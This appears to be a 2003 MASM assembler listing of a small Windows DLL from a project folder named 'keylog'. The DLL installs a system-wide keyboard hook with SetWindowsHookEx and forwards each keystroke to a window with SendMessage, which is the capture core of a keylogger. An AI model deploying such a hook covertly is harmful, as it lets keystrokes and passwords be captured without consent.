Microsoft (R) Macro Assembler Version 6.14.8444		    07/11/03 22:58:35
D:\programming\WIN32ASM\keylog\kl.asm			     Page 1 - 1


				;32BIT DLL
				.386
				.model	flat,stdcall
				.nolist
				.listall
				includelib user32.lib
				includelib kernel32.lib

 00000000			.data

 00000000 00000000		hInst	HINSTANCE	0

 00000000			.data?
 00000000 00000000		hhook	dd	?
 00000004 00000000		hwnd	HWND	?
 00000000			.code
 00000000			DllEntry proc hinst:HINSTANCE,reason:dword,reserved1:dword
 00000000  55		   *	    push   ebp
 00000001  8B EC	   *	    mov    ebp, esp
 00000003  B8 00000001			mov	eax,TRUE
					.if 	reason==DLL_PROCESS_ATTACH
 00000008  83 7D 0C 01	   *	    cmp    reason, DLL_PROCESS_ATTACH
 0000000C  75 0B	   *	    jne    @C0001
						m2m	hInst,hinst
 0000000E  FF 75 08	     1		push	hinst
 00000011  8F 05 00000000 R  1		pop	hInst
					.elseif reason==DLL_PROCESS_DETACH
 00000017  EB 10	   *	    jmp    @C0003
 00000019		   *@C0001:
 00000019  83 7D 0C 00	   *	    cmp    reason, DLL_PROCESS_DETACH
 0000001D  75 02	   *	    jne    @C0004

					.elseif reason==DLL_THREAD_ATTACH
 0000001F  EB 08	   *	    jmp    @C0006
 00000021		   *@C0004:
 00000021  83 7D 0C 02	   *	    cmp    reason, DLL_THREAD_ATTACH
 00000025  75 02	   *	    jne    @C0007

					.else        ; DLL_THREAD_DETACH
 00000027  EB 00	   *	    jmp    @C0009
 00000029		   *@C0007:

					.endif
 00000029		   *@C0009:
 00000029		   *@C0006:
 00000029		   *@C0003:
					ret
 00000029  C9		   *	    leave  
 0000002A  C2 000C	   *	    ret    0000Ch
 0000002D			DllEntry endp


 0000002D			installhook	proc hWnd:HWND
					m2m	hwnd,hWnd
 0000002D  55		   *	    push   ebp
 0000002E  8B EC	   *	    mov    ebp, esp
 00000030  FF 75 08	     1		push	hWnd
 00000033  8F 05 00000004 R  1		pop	hwnd
 00000039  B8 00000063 R		mov	eax,offset keyproc
					invoke	SetWindowsHookEx,WH_KEYBOARD,eax,hInst,0
 0000003E  6A 00	   *	    push   +000000000h
 00000040  FF 35 00000000 R *	    push   hInst
 00000046  50		   *	    push   eax
 00000047  6A 02	   *	    push   +000000002h
 00000049  E8 00000000 E   *	    call   SetWindowsHookExA
 0000004E  A3 00000000 R		mov	hhook,eax	
					ret
 00000053  C9		   *	    leave  
 00000054  C2 0004	   *	    ret    00004h
 00000057			installhook	endp

 00000057			removehook	proc
					invoke	UnhookWindowsHookEx,hhook
 00000057  FF 35 00000000 R *	    push   hhook
 0000005D  E8 00000000 E   *	    call   UnhookWindowsHookEx
 00000062  C3				ret
 00000063			removehook	endp

 00000063			keyproc	proc code:dword,wparam:WPARAM,lparam:LPARAM
 00000063  55		   *	    push   ebp
 00000064  8B EC	   *	    mov    ebp, esp
					invoke	CallNextHookEx,hhook,code,wparam,lparam	
 00000066  FF 75 10	   *	    push   dword  ptr ss:[ebp]+000000010h
 00000069  FF 75 0C	   *	    push   dword  ptr ss:[ebp]+00000000Ch
 0000006C  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
 0000006F  FF 35 00000000 R *	    push   hhook
 00000075  E8 00000000 E   *	    call   CallNextHookEx
 0000007A  81 65 10			and	lparam,10000000000000000000000000000000b
	   80000000
					.if	lparam==0
 00000081  83 7D 10 00	   *	    cmp    lparam, 000h
 00000085  75 16	   *	    jne    @C000A
						invoke	SendMessage,hwnd,WM_USER+1,wparam,lparam
 00000087  FF 75 10	   *	    push   dword  ptr ss:[ebp]+000000010h
 0000008A  FF 75 0C	   *	    push   dword  ptr ss:[ebp]+00000000Ch
 0000008D  68 00000401	   *	    push   +000000401h
 00000092  FF 35 00000004 R *	    push   hwnd
 00000098  E8 00000000 E   *	    call   SendMessageA
					.endif
 0000009D		   *@C000A:
					ret
 0000009D  C9		   *	    leave  
 0000009E  C2 000C	   *	    ret    0000Ch
 000000A1			keyproc	endp
				end	DllEntry
